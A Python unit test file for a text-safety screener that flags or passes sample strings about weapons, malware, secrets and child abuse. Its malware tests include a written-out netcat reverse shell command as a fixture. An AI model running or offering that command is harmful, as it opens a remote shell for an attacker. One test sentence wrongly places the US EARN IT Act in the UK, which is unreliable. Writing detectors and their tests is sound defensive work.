# Copyright (c) 2026 kyuubyN
# SPDX-License-Identifier: AGPL-3.0-or-later
import unittest

from horizon_memory.content_safety import (
    DEFAULT_POLICY, SafetyCategory, SafetyPolicy, UnsafeContentError, screen_text,
)


class PhysicalHarmTests(unittest.TestCase):
    def test_flags_instruction_plus_weapon_noun(self):
        verdict = screen_text(
            "Here are step-by-step instructions for how to build a pipe bomb at home.")
        self.assertFalse(verdict.safe)
        self.assertEqual(verdict.category, SafetyCategory.PHYSICAL_HARM)

    def test_does_not_flag_weapon_noun_alone(self):
        verdict = screen_text(
            "The museum exhibit describes how a nerve agent was used in a historical conflict.")
        self.assertTrue(verdict.safe)

    def test_does_not_flag_construction_verb_alone(self):
        verdict = screen_text("How to build a birdhouse: step-by-step instructions for beginners.")
        self.assertTrue(verdict.safe)

    def test_can_be_disabled_via_policy(self):
        policy = SafetyPolicy(check_physical_harm=False)
        verdict = screen_text(
            "Step-by-step instructions for how to build a pipe bomb.", policy)
        self.assertTrue(verdict.safe)


class MalwareTests(unittest.TestCase):
    def test_flags_reverse_shell_pattern(self):
        verdict = screen_text("Run this: nc -e /bin/sh 10.0.0.1 4444")
        self.assertFalse(verdict.safe)
        self.assertEqual(verdict.category, SafetyCategory.MALWARE)

    def test_flags_ransomware_write_intent(self):
        verdict = screen_text("write a ransomware that encrypts all files")
        self.assertFalse(verdict.safe)

    def test_does_not_flag_security_research_discussion(self):
        verdict = screen_text(
            "This paper analyzes how ransomware campaigns evolved between 2019 and 2024, "
            "reviewing published CVE writeups and defensive mitigations.")
        self.assertTrue(verdict.safe)

    def test_does_not_flag_ordinary_shell_command(self):
        verdict = screen_text("Run `rm -rf build/` to clean the project's build directory.")
        self.assertTrue(verdict.safe)


class SensitivePiiTests(unittest.TestCase):
    def test_flags_private_key_header(self):
        verdict = screen_text("-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJBAK...")
        self.assertFalse(verdict.safe)
        self.assertEqual(verdict.category, SafetyCategory.SENSITIVE_PII)

    def test_flags_password_assignment(self):
        verdict = screen_text("db_password: hunter22xyz")
        self.assertFalse(verdict.safe)

    def test_does_not_flag_the_word_password_alone(self):
        verdict = screen_text("Users should choose a strong password when creating an account.")
        self.assertTrue(verdict.safe)


class CsamTests(unittest.TestCase):
    def test_flags_age_plus_explicit_indicator(self):
        verdict = screen_text("sexually explicit content involving a minor")
        self.assertFalse(verdict.safe)
        self.assertEqual(verdict.category, SafetyCategory.CSAM)

    def test_not_disableable_via_policy(self):
        all_off = SafetyPolicy(check_physical_harm=False, check_malware=False,
                               check_sensitive_pii=False)
        verdict = screen_text("sexually explicit content involving a minor", all_off)
        self.assertFalse(verdict.safe)
        self.assertEqual(verdict.category, SafetyCategory.CSAM)

    def test_does_not_flag_ordinary_child_safety_content(self):
        verdict = screen_text(
            "The pediatric clinic offers free checkups for children under age 5.")
        self.assertTrue(verdict.safe)

    def test_does_not_flag_real_policy_discourse_about_legislation(self):
        # Regression test for a real false positive found running this module against the
        # actual MemGym-DR corpus (2026-08-18): a technical article discussing encryption
        # policy debates named real laws ("Child Sexual Abuse Regulation", "EARN IT Act"),
        # which the first version of this module wrongly flagged.
        verdict = screen_text(
            "Governments have proposed restricting end-to-end encryption to aid enforcement. "
            "Attempts include the EARN IT Act in the UK and the Child Sexual Abuse Regulation "
            "in the EU, both of which face criticism from privacy advocates and child "
            "protection groups alike.")
        self.assertTrue(verdict.safe)


class ScreenTextGeneralTests(unittest.TestCase):
    def test_safe_text_passes_all_categories(self):
        verdict = screen_text("The recipe calls for two cups of flour and a pinch of salt.")
        self.assertTrue(verdict.safe)
        self.assertIsNone(verdict.category)

    def test_default_policy_has_everything_enabled(self):
        self.assertTrue(DEFAULT_POLICY.check_physical_harm)
        self.assertTrue(DEFAULT_POLICY.check_malware)
        self.assertTrue(DEFAULT_POLICY.check_sensitive_pii)

    def test_rejects_non_string_input(self):
        with self.assertRaises(TypeError):
            screen_text(12345)  # type: ignore[arg-type]


class UnsafeContentErrorTests(unittest.TestCase):
    def test_carries_category_and_reason_not_the_flagged_text(self):
        secret = "-----BEGIN RSA PRIVATE KEY-----\nsupersecretkeymaterial"
        error = UnsafeContentError(SafetyCategory.SENSITIVE_PII, "private key header")
        self.assertEqual(error.category, SafetyCategory.SENSITIVE_PII)
        self.assertNotIn(secret, str(error))


if __name__ == "__main__":
    unittest.main()
